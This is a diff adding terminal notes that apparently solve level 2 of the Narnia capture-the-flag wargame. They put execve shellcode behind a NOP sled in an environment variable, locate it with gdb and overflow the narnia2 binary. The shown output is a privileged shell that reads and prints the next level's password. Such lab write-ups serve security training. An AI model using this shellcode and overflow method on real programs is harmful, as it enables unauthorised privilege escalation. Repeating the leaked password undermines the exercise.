@@ -1,0 +1,36 @@
+######## EXPLOITING THE BUFFER OVERFLOW USING ENV VARIABLE ##############
+
+--------------------------
+
+narnia2@narnia:/narnia$ export SHELLCODE=$(perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+narnia2@narnia:/narnia$ echo $SHELLCODE
+��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS��
+
+---------------------------
+
+(gdb) x/s 0xffffddeb
+0xffffddeb:	"SHELLCODE=", '\220' <repeats 190 times>...
+(gdb) x/s 0xffffddeb+100
+0xffffde4f:	'\220' <repeats 110 times>, "\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+(gdb) x/s 0xffffddeb+50
+0xffffde1d:	'\220' <repeats 160 times>, "\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+(gdb) x/s 0xffffddeb+70
+0xffffde31:	'\220' <repeats 140 times>, "\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+(gdb) x/s 0xffffddeb+60
+0xffffde27:	'\220' <repeats 150 times>, "\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 9401] will be killed.
+
+Quit anyway? (y or n) y
+narnia2@narnia:/narnia$ ./narnia $(perl -e 'print "\x4f\xde\xff\xff"x40')
+-bash: ./narnia: No such file or directory
+narnia2@narnia:/narnia$ ./narnia2 $(perl -e 'print "\x4f\xde\xff\xff"x40')
+$ id
+uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14002(narnia2)
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+$ exit
+
+-----------------------
